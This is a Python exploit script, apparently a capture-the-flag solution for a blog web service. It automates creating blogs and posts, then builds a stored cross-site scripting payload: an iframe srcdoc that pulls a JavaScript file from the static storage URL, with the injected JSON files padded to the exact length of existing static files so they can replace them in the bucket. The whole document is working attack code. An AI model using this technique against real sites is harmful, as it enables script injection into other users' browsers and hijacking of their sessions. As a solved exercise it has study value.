#!/usr/bin/env python3

import html
import json
import sys
import time
from urllib.parse import urljoin

import requests
import urllib3

urllib3.disable_warnings()


def create_blog(task_url: str, name: str, n_posts: int) -> str:
    s = requests.session()

    r = s.get(task_url, verify=False)
    r.raise_for_status()
    time.sleep(0.2)

    r = s.post(urljoin(task_url, "/api/blogs"), json={"name": name}, verify=False)
    r.raise_for_status()
    time.sleep(0.2)

    r = s.get(urljoin(task_url, "/api/user"), verify=False)
    r.raise_for_status()
    time.sleep(0.2)

    blog_id = r.json()["blog_id"]
    print(f"Created blog {blog_id} for {name}, session = {s.cookies}")

    for i in range(n_posts):
        r = s.post(
            urljoin(task_url, "/api/posts"),
            json={"title": f"post {i}", "content": "A" * 256},
            verify=False,
        )
        r.raise_for_status()
        time.sleep(0.2)

    return blog_id


def blog_static_length(static_url: str, blog_id: str) -> int:
    r = requests.get(urljoin(static_url, f"/{blog_id}.json"), verify=False)
    l = len(r.content)
    print(f"Blog {blog_id} static is {l} bytes long")
    return l


def prepare_injection(static_url: str, script_blog_id: str) -> str:
    srcdoc = html.escape(f'<script src="{static_url}/{script_blog_id}.json"></script>')
    content = f'<iframe srcdoc="{srcdoc}"></iframe>'

    desc = {"name": "Vzlom", "posts": [{"title": "vzlom", "content": content}]}
    return json.dumps(desc)


def main():
    if len(sys.argv) != 3:
        print(
            f"Usage: {sys.argv[0]} [task URL] [static URL]",
            file=sys.stderr,
        )
        sys.exit(1)

    task_url = sys.argv[1]
    static_url = sys.argv[2]

    injection_blog_id = create_blog(task_url, "injection", 20)
    script_blog_id = create_blog(task_url, "script", 20)

    print(
        f"Will use blog {injection_blog_id} for the main injection, and {script_blog_id} for the JS script"
    )

    injection = prepare_injection(static_url, script_blog_id)
    with open("script.js") as f:
        script = f.read()

    injection = injection.ljust(blog_static_length(static_url, injection_blog_id), " ")
    script = script.ljust(blog_static_length(static_url, script_blog_id), " ")

    with open(f"{injection_blog_id}.json", "w") as f:
        f.write(injection)

    with open(f"{script_blog_id}.json", "w") as f:
        f.write(script)

    print(
        f"Created files {injection_blog_id}.json and {script_blog_id}.json, upload them to your bucket"
    )


if __name__ == "__main__":
    main()
